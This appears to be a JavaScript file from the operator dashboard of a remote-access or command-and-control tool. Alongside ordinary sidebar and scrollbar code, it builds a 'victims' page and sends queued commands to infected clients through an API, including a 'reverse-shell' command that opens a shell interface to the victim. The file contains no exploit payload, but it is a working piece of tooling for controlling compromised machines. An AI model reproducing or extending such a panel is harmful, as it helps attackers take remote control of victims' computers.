/* ---------------------------------------------------
    CUSTOM SCROLLBAR
----------------------------------------------------- */
$(document).ready(function () {

    $("#sidebar").mCustomScrollbar({
        theme: "minimal"
    });

    $('#sidebarCollapse').on('click', function () {
        $('#sidebar, #content').toggleClass('active')
        $('.collapse.in').toggleClass('in')
        $('a[aria-expanded=true]').attr('aria-expanded', 'false')
    });

});

/* ---------------------------------------------------
    VICTIMS PAGE : Open link to access specific victim
----------------------------------------------------- */
$(document).ready(function ($) {
    $('*[data-href]').not($('.btn-command')).on('click', function () {
        window.location = $(this).data("href")
    });
});


/* ---------------------------------------------------
    SPECIFIC VICTIM PAGE : Buttons to submit commands via AJAX
----------------------------------------------------- */
$(document).ready(function ($) {

    $('.btn-command').on('click', function () {

        const command = JSON.stringify({ "name": $(this).data("command").toUpperCase() })
        const url = new URL(window.location.origin + '/api/clients/' + $(this).data("uuid") + '/commands')

        $.ajax({
            type: "POST",
            data: command,
            url: url,
            contentType: "application/json"
        })
            .done((data) => {
                console.log("The AJAX request is a success !")
                console.log(data)
                $('#commandSent').show("slow")
                //alert("Command successfully added to the queue !")
            })
            .fail(() => {
                console.log("The AJAX request failed ...")
                alert("An error occurred ...")
            })

        // If it's a shell's request, then we open the shell interface in a new tab
        if ($(this).data("command") === "reverse-shell") {
            const url = new URL(window.location.origin + '/app/command/shell/' + $(this).data("uuid"))
            window.open(url, '_blank')
        }
    });
});
